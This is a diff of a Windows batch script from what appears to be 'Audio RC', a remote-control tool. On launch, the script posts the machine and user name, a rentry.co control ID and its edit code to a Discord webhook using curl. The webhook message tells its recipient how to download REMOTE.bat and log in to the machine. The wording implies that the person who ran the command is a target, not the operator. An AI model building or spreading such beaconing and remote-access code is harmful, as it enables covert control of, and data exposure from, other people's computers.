@@ -209,7 +209,7 @@ if defined Arg[1] (
         )
     )
     if "!ValidWebhook!"=="true" (
-     >"%temp%\DiscordMsg.json" echo {"content":"","embeds":[{"title":"Audio RC - Version !Version!","color":12740351,"description":"``%computername%\\%username%`` _has just ran the command that leads to this webhook, login details below_ :heart_eyes:\n\n🔒 __**REMOTE LOGIN CREDENTIALS**__\n_**LOGIN NAME:**_ [!HOST.ID!](https://rentry.co/!HOST.ID!)\n_**PASSWORD:**_ ``!HOST.EDIT_CODE!``\n\n🔽 __**DOWNLOAD REMOTE SCRIPT**__\n_To login you must install the remote script_\n**-** Download the [archive](https://github.com/agamsol/Audio-RC/blob/2.0/REMOTE/Remote%%20Archive.zip?raw=true)\n**-** Extract the files into a folder\n**-** Run the file `REMOTE.bat`\n**-** Enter the credentials above to login\n","timestamp":"","author":{},"image":{},"thumbnail":{},"footer":{},"fields":[]}],"components":[]}
+     >"%temp%\DiscordMsg.json" echo {"content":"","embeds":[{"title":"Audio RC - Version !Version!","color":12740351,"description":"``%computername%\\%username%`` _has just ran the command that leads to this webhook, login details below_ :heart_eyes:\n\n🔒 __**REMOTE LOGIN CREDENTIALS**__\n_**LOGIN CODE:**_ [!HOST.ID!](https://rentry.co/!HOST.ID!)\n_**PASSWORD:**_ ``!HOST.EDIT_CODE!``\n\n🔽 __**DOWNLOAD REMOTE SCRIPT**__\n_To login you must install the remote script_\n- Download the [Remote Script](https://raw.githubusercontent.com/agamsol/Audio-RC/2.0/REMOTE/REMOTE.bat)\n> NOTE: You should download the script and put it on a folder on its own, this will grant you easy access to it whenever you need & want.\n- Open the file [`REMOTE.bat`](https://github.com/agamsol/Audio-RC/blob/2.0/REMOTE/REMOTE.bat)\n- Enter the credentials to login.","timestamp":"","author":{},"image":{},"thumbnail":{},"footer":{},"fields":[]}],"components":[]}
      "!PATHS.curl!" !Request! -skH "Content-Type: multipart/form-data" -F "payload_json=<%temp%\DiscordMsg.json" "!Webhook!"
      del /s /q "%temp%\DiscordMsg.json" >nul 2>&1
     )
@@ -218,13 +218,12 @@ if defined Arg[1] (
 timeout /t 2 /nobreak >nul
 
 :SOCKET
-:INTERNET_CONNECTION_SOCKET
 ping -n 1 youtube.com | findstr /c:"TTL">nul || (
     echo:
     echo  ERROR: Unable to connect to youtube.com
     echo         Retrying in 5 seconds
     timeout /t 5 /nobreak>nul
-    goto :INTERNET_CONNECTION_SOCKET
+    goto :SOCKET
 )
 
 call "!File[1]!" --raw --url "!HOST.ID!" --file "!File[6]!" --curl "!PATHS.curl!"
